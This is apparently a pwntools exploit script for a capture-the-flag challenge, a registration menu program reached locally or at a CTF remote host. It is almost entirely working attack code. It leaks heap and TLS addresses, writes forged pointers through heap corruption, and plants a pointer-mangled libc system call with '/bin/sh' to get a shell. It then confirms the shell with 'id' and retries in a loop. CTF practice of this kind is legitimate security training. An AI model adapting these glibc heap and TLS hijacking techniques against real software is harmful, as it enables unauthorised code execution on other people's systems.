from pwn import *
import pwn
import random as rnd
import struct as st
from time import sleep
import re
import subprocess
from itertools import *
from more_itertools import *

context.arch = "amd64"
context.word_size = 64
context.bits = 64
context.os = "linux"

file = "./chall"
exe_args = []
io: process = None
PREFIX = b"? "

speed = 0.2

def debug():
    gdb.attach(io, gdbscript=
    """

    """)
    input("debug")

def launch_remote():
    global file, io
    conn = "ctf-registration.chal.wwctf.com 1337"
    # conn = "localhost 5000"
    conn = conn.split(" ")
    io = remote(conn[0], conn[1])

def launch_local():
    global file, io
    io = process([file, *exe_args])
    if args.GDB:
        debug()

def solve_pow():
    leak = recvu(b"===================")
    pow = getb(leak, b") solve ", b"\n").decode()
    proc = subprocess.Popen(["solvepow", "solve", pow], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
    pow = proc.communicate()[0]
    sla(b"Solution? ", pow)

rotate_left = lambda x, a, s=64: (x << a) | (x >> (s-a))
rotate_right = lambda x, a, s=64: (x >> a) | (x << (s-a))

u64 = lambda d: pwn.u64(d.ljust(8, b"\0")[:8])
u32 = lambda d: pwn.u32(d.ljust(4, b"\0")[:4])
u16 = lambda d: pwn.u16(d.ljust(2, b"\0")[:2])
sla = lambda a, b: io.sendlineafter(a, b)
sa = lambda a, b: io.sendafter(a, b)
sl = lambda a: io.sendline(a)
recv = lambda: io.recv()
recvn = lambda a: io.recvn(a)
recvu = lambda a, b=False: io.recvuntil(a, b)
safe_link = lambda addr, ptr: (addr >> 12) ^ ptr
ptr_mangle = lambda addr, cookie=0: rotate_left(addr ^ cookie, 17)
ptr_demangle = lambda addr, cookie=0: rotate_right(addr, 17) ^ cookie
binsh = lambda: next(libc.search(b"/bin/sh\0"))
snum = lambda a, b: sla(a, str(b).encode("iso-8859-1"))
slaprefix = lambda a: sla(PREFIX, a)
saprefix = lambda a: sa(PREFIX, a)
choice = lambda a: snum(PREFIX, a)
show_leak = lambda a, b: success("%s: %#018x" % (a, b))

def launch():
    if args.REMOTE:
        l = launch_remote
    else:
        l = launch_local
    with context.local(log_level=logging.ERROR):
        l()
    if args.POW:
        solve_pow()

def getb(d, a, b):
    a_ = d.find(a)
    if a_ == -1 or a == b"": a_ = 0
    b_ = d.find(b, a_+len(a))
    if b_ == -1 or b == b"": b_ = len(d)
    return d[a_+len(a):b_]
def getr(d, p):
    return re.findall(p, d)[0]

# ================================================================
# EXPLOIT HERE
# ================================================================

with context.local(log_level=logging.ERROR):
    exe = ELF(file)
    libc = ELF("./libc.so.6")

tries = 0
tries_prog = log.progress("Tries")
def exploit():
    def alloc(age=0, name=b"", desc=b""):
        sla(b">> ", b"1")
        if type(age) == str:
            slaprefix(age)
        else:
            choice(age)
        slaprefix(name)
        slaprefix(desc)
        return int(getb(recvu(b"1) Reg"), b"number is ", b" !"))
    def show_age(index):
        sla(b">> ", b"2")
        choice(index)
        return int(getb(recvu(b"1) Reg"), b"Age: ", b"\n"))
    def quit():
        sla(b">> ", b"3")
        
    alloc()
    leaker = alloc(b"-")
    heap0x30_base = show_age(leaker) & ~0xfff
    # libc.address = show_age(leaker) + 0x17bfff20
    # show_leak("libc", libc.address)


    payload = flat([
        b"A"*0x10,
        heap0x30_base+0x48,
    ])
    alloc(0, b"", payload)

    alloc(0, b"", b"A"*0x20)

    alloc()
    alloc()
    
    heap_leaker = alloc(b"-")
    heap = show_age(heap_leaker)
    
    tls_leaker = alloc(b"-")
    tls = show_age(tls_leaker)

    show_leak("heap0x30", heap0x30_base)
    show_leak("heap    ", heap)
    show_leak("tls     ", tls)

    alloc(tls-0x60)

    alloc(tls-0x60)
    alloc(heap0x30_base + 0x1020)

    libc.address = tls + 0x28c0
    # libc.address = heap + 0x1000
    # libc.address = heap0x30_base + 0x17c00000
    show_leak("libc    ", libc.address)

    payload = flat([
        ptr_mangle(libc.sym.system),
        binsh(),
    ])
    alloc(0, b"", payload)
    alloc()
    alloc()
    alloc()
    alloc()

    # alloc(tls-0x98)
    # alloc(0, b"", b"A"*0x20)
    # alloc()
    # alloc()
    # libc_leaker = alloc(b"-")
    # libc.address = show_age(libc_leaker) - 0x21b580
    # show_leak("libc    ", libc.address)
    # show_leak("libc2   ", tls+0x28c0)
    # exit()

    alloc(tls+0x30)
    alloc(0, b"", b"A"*0x20)

    alloc()
    alloc()

    alloc(0)

    quit()

    sl(b"id")
    if io.recvuntil(b"uid", timeout=0.2) == b"":
        raise EOFError

    io.interactive()
    exit()

# launch()
# exploit()
# exit()

while True:
    count = 0
    tries += 1
    tries_prog.status(str(tries))

    launch()
    try:
        exploit()
    except EOFError:
        pass

    with context.local(log_level=logging.ERROR):
        io.close()
    # sleep(0.05)
